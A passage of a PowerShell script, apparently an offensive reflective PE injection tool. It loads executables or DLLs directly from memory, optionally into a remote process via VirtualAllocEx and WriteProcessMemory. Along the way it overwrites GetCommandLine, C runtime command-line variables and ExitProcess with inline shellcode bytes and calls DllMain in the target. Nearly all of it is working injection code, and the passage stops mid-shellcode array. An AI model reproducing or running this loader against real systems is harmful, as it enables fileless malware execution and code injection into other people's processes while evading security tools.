                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                }

                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )

        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }

        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }

        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)

            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize

            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }

    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,

        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )

        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @()

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0

        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }

        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)

        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8

        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length


        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp

        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null


        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp

        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################


        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }

                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)

                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)

                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null

                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################


        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process

        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr

        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr

        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length

            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)

            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }


    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )

        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)

        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }

        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,

        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types

        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }

        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }


        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }

            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }

            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }

            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }


        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"

        [IntPtr]$LoadAddr = [IntPtr]::Zero
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }

        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)

            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }

        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        {
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null


        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"


        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types


        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types


        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }


        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }


        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }


        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
